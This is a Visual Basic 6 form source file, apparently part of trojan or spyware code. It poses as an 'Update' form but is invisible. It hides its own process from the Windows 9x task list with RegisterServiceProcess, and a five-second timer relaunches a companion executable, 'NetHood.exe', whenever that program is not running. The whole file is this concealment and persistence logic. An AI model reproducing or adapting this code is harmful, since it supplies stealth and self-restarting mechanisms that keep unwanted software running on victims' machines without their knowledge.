VERSION 5.00
Begin VB.Form Update 
   AutoRedraw      =   -1  'True
   ClientHeight    =   3180
   ClientLeft      =   2580
   ClientTop       =   3240
   ClientWidth     =   7260
   Icon            =   "Update.frx":0000
   LinkTopic       =   "Update"
   ScaleHeight     =   3180
   ScaleWidth      =   7260
   Visible         =   0   'False
   Begin VB.Timer Restarter 
      Interval        =   5000
      Left            =   2640
      Top             =   840
   End
End
Attribute VB_Name = "Update"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Private Sub Form_Load()
If App.PrevInstance Then End
If OS = 1 Then
RegisterServiceProcess GetCurrentProcessId, 1
End If
End Sub

Private Sub Form_Unload(Cancel As Integer)
Erase TheArray
Erase TheId
Erase TheThread
End Sub




Private Sub Restarter_Timer()
On Error Resume Next
Initialize
If Not CheckTask("NetHood.exe") Then
Shell "C:\Progra~1\IM\Nethood.exe", vbNormalFocus
End If
End Sub


